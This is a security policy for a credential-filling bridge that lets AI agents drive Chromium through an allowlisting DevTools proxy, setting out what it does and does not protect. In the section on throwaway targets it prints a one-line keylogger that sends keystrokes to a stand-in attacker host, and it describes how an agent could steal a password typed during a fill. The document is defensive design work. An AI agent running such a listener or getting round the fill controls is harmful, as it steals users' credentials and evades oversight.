# Security policy

Report vulnerabilities to **security@1claw.co**. Do not open a public issue.

## What this component promises

- A secret fetched for a fill never leaves the bridge process, and never
  appears in a tool result, a log line, or an error message.
- The bridge is the only process attached to Chromium. Agent frameworks connect
  through a CDP **allowlist** proxy — not a response filter, and not a
  denylist, because CDP has ~50 domains and changes every Chromium release.
- Fill safety rules are enforced by the core on every backend. A driver can
  refuse a fill; it cannot widen what is allowed.

## What it does not promise

- Protection from a same-user attacker who can already run code as you. On a
  developer machine the same-user boundary is the weakest link.
- Protection of a secret already in memory from a process debugger.
- That a garbage-collected `SecretHandle` was zeroed. Only `dispose()`,
  `using`, and `use()` guarantee that.
- That a secret never exists as a string anywhere in the process. To type a
  password, the bridge must put those characters into a CDP `Input.*` command,
  and CDP is JSON — so the value transits the pipe to Chromium as text. That is
  inherent to driving a browser and is not something the handle can prevent.
  The invariant `SecretHandle` enforces is narrower and precise: the secret
  never reaches the *agent*, in a tool result, a log line, or an error.
- That a compromised **login page** cannot read what is typed into it. The
  credential is typed into a target the agent has never scripted, which removes
  the agent's own listeners from the picture, but the page at `login_url` runs
  its own JavaScript and receives the keystrokes by design — that is what
  filling a form means. The binding's `login_url` is therefore a trust
  statement: it names the site you are handing the credential to.
- That the page cannot observe the fill *at all*. `Input.insertText` produces
  real input events, so `input` and `beforeinput` handlers on the login page see
  them. Only listeners the **agent** installed are excluded, by running the fill
  in a target the agent has never had a session on.

## Why the fill runs in a throwaway target

Blocking the agent's CDP access during a fill is necessary and not sufficient.
`Runtime.evaluate` is allowlisted *outside* a fill window, so an agent can run

```js
addEventListener('keydown', e => fetch('https://evil.example/?k=' + e.key), true)
```

on its page beforehand and read the credential as it is typed, without issuing a
single CDP command while the window is open. A control that inspects commands
during the window cannot see an attack that sends none.

So the fill happens in a target created for it and closed afterwards, in the
agent's browser context. A page the agent has never scripted has no listeners to
fire. The cookie still lands in the shared context, so the agent's own page is
authenticated once the fill completes — which is the point of the fill.

The throwaway target is itself inside a fill window, because `Target.getTargets`
and `Target.attachToTarget` are allowlisted: a fresh target that is not blocked
would be hidden rather than protected.
